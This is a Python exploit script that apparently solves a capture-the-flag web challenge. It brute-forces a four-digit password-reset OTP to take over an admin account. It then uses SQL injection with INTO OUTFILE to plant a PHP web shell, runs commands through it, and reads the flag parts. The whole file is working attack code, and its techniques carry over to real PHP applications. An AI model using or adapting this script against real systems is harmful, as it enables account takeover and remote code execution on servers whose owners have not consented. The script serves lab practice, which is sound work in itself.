import re, concurrent.futures as cf, requests
from requests.adapters import HTTPAdapter, Retry

BASE = "http://cc8a5a43-a2b1-4513-8899-c9f4b9c12358.51.79.140.18.nip.io:8080/"
ADMIN = "hr.fehn"
NEWPASS = "abc123!"
HEADERS = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                         "AppleWebKit/537.36 (KHTML, like Gecko) "
                         "Chrome/120.0 Safari/537.36"}
S = requests.Session()
S.headers.update(HEADERS)
_retry = Retry(total=5, backoff_factor=0.3,
               status_forcelist=[502, 503, 504], allowed_methods=None)
_adapter = HTTPAdapter(max_retries=_retry, pool_maxsize=16)
S.mount("http://", _adapter)
S.mount("https://", _adapter)


def brute_otp():
    r = S.post(f"{BASE}/forgot.php", data={"username": ADMIN}, allow_redirects=False)
    if r.status_code == 403:
        raise SystemExit("[!] 403 from edge WAF — User-Agent blocked (check HEADERS)")
    if r.status_code != 302:
        raise SystemExit(f"[!] user {ADMIN!r} does not exist (forgot.php gave "
                         f"{r.status_code}, not 302) — pass real admin as argv[2]")

    def attempt(otp):
        r = S.post(
            f"{BASE}/reset.php", params={"username": ADMIN},
            data={"otp": f"{otp:04d}", "password": NEWPASS},
            allow_redirects=False, timeout=15,
        )
        # success -> 302 to login.php; wrong/expired OTP -> 200
        loc = r.headers.get("Location", "")
        return otp if r.status_code == 302 and "login.php" in loc else None

    with cf.ThreadPoolExecutor(max_workers=8) as ex:
        for f in cf.as_completed(ex.submit(attempt, i) for i in range(10000)):
            hit = f.result()
            if hit is not None:
                return f"{hit:04d}"
    raise SystemExit("[!] OTP not found (expired? re-run)")


def login():
    r = S.post(f"{BASE}/login.php", data={"username": ADMIN, "password": NEWPASS},
               allow_redirects=False)
    assert r.status_code == 302, "login failed"


def write_shell(path="/var/www/html/uploads/webshell.php"):
    php = "<?php system($_GET['c']); ?>"
    hx = "0x" + php.encode().hex()
    cols = ",".join([hx] + ["''"] * 8)
    payload = f"0 UNION SELECT {cols} INTO OUTFILE '{path}';--"
    print(payload)
    S.post(f"{BASE}/preview.php", data={"cv_id": payload}, allow_redirects=False)


def sh(cmd):
    return S.get(f"{BASE}/uploads/webshell.php", params={"c": cmd}).text


def main():
    print(f"[*] target {BASE}")
    print("[*] brute-forcing admin OTP (0000-9999)...")
    print(f"[+] OTP = {brute_otp()}  -> admin password reset to '{NEWPASS}'")
    login()
    print("[+] logged in as admin")

    part1 = re.search(r"LYKN\{[^<]*", S.get(f"{BASE}/admin.php").text)
    print(f"[+] part1: {part1.group(0) if part1 else '??'}")

    write_shell()
    who = sh("id").strip()
    assert "uid=" in who, f"shell not working: {who!r}"
    print(f"[+] RCE as: {who}")

    part2 = sh("csvtool cat /part2.txt").strip()
    print(f"[+] part2: {part2}")
    print(f"\n[FLAG] {part1.group(0) if part1 else ''}{part2}")


if __name__ == "__main__":
    main()
